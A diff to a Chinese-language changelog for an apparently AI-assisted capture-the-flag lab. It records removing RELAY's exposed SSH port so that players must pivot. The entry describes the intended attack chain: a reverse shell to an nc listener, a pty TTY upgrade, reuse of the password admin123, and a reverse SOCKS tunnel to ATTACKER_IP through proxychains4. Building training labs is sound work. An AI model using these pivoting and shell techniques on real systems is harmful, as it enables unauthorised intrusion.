@@ -168,3 +168,17 @@
 - walkthrough Act I 的 `nmap -p- TARGET` 預期輸出寫「80/tcp」，但 TARGET 是 docker host、host port 映射是 8080，而且 RELAY 的 2222/ssh 也會在同一次掃描裡出現。已修正成 8080/tcp + 8025/tcp + 2222/tcp，並註明 2222 是 RELAY 的、不是 frontier 自己的服務。
 
 以下 1 點 reviewer 明確標注「不算 bug，你的取捨」，維持原樣不動：webmail `/inbox` 沒有 session 驗證，玩家可以不找密碼直接 GET 進去看到 DB root 密碼等內容——這是既有攻略文件已經寫明的刻意保留漏洞，不是遺漏。
+
+## 第十輪：RELAY 不再對外開 SSH port（架構真實感修正，接受難度變高）
+
+原本的架構有一個「lab 感」的破綻：三台 host 概念上是 FRONTIER → RELAY → ARCHIVE 依序 pivot，但 `docker-compose.yml` 把 RELAY 的 SSH（`2222:22`）也映射到宿主機，跟 FRONTIER 的 `8080`/`8025` 一樣直接對攻擊機開放。結果第一次 `nmap -p- TARGET` 就會同時看到 RELAY 的 SSH，從攻擊者視角比較像「一台 server 開三個 port」而不是「打進 FRONTIER 才發現後面還有一台 RELAY」，跟 ARCHIVE 已經做到的「完全不映射 port、必須真的 pivot」不一致。
+
+**這是使用者自己發現並主動提出的**（不是外部 code review），並且在提出時已經預期並接受「Act II 會變難」這個 tradeoff，明確要求動手改。
+
+修法：
+- `docker-compose.yml` 移除 `relay` 的 `ports: - "2222:22"`，其餘網路設定（dmz/internal 雙掛、`cap_add: NET_ADMIN`）不變。RELAY 現在跟 ARCHIVE 一樣，完全不對宿主機開任何 port。
+- 玩家現在必須先在 FRONTIER 拿到執行權限（upload polyglot 或 ping injection），把一次性的 webshell 升級成真正的互動式 shell（bash reverse shell 回自己的 nc listener，再用 `python3 -c 'import pty; pty.spawn("/bin/bash")'` 升級 TTY），才能在這個真終端機裡對 `172.20.1.12`（RELAY 的 dmz IP，跟 FRONTIER 同網段，container 間互通不需要額外設定）打 `ssh sysadmin@172.20.1.12`，密碼還是原來的 `admin123`——這組密碼重用本身完全沒變，變的只是「怎麼把這組密碼用出去」。
+- ARCHIVE 那一段（原本靠 `ssh -p 2222 sysadmin@TARGET -L ...` 直接從攻擊機把 port 轉發到自己本機）也連帶失效，因為攻擊機再也無法直接對 RELAY 起一個 ssh 連線。改成：在已經拿到的 RELAY shell 裡開一個反向 dynamic SOCKS 轉發回攻擊機自己的 sshd（`ssh -R 1080 <帳號>@ATTACKER_IP -N`），讓攻擊機本機出現一個 SOCKS proxy，背後走的是 RELAY 的網路視角；接下來攻擊機自己的 `smbclient`/`curl`/`ssh`（拿 `cairn_backup_key` 登入 ARCHIVE 那一步也一樣）全部透過 `proxychains4` 打。這正好是原本就裝在 RELAY 上、但一直沒有真正被用到的 `proxychains4` 套件的用途——之前的設計裡它形同虛設，這輪修正後才變成玩家真正會用到的工具。
+- 這個改動不影響 RELAY/ARCHIVE 內部的任何漏洞機制、憑證、文件內容——只改變「怎麼連進去」，不改變「連進去之後看到什麼」。已重新 `docker compose build --no-cache && docker compose up -d` 完整 rebuild，並實測驗證：外部 `nmap -p 22,2222,8080,8025 TARGET` 確認只剩 8080/8025 開放；從 FRONTIER 的 www-data webshell 確認能直連 `172.20.1.12:22`；用完整互動式 shell 實測 `ssh sysadmin@172.20.1.12` 密碼登入成功；RELAY 對 `cairn.internal` 的既有內部路由（`/etc/ledger/sync.conf`、LEDGER API）全部沒受影響。
+
+更新的文件：`docker-compose.yml`、`start.sh`（移除已經打不到的 `check_port localhost 2222`）、`README.md`（更新對外開放 port 的說明）、`story-dev/attack_chain_design.md`（§0 架構圖、§2.1 recon 預期輸出、§3.1 憑證重用改成 pivot 步驟、§3.2 API 存取路徑、§4.1/§4.2/§4.2b 全部改成走 `proxychains4` + 反向 SOCKS）、`Answer/walkthrough.md`（步驟 1、8、9、13、14、16、17、20，補上真正的 pivot/TTY 升級/SOCKS 步驟）。
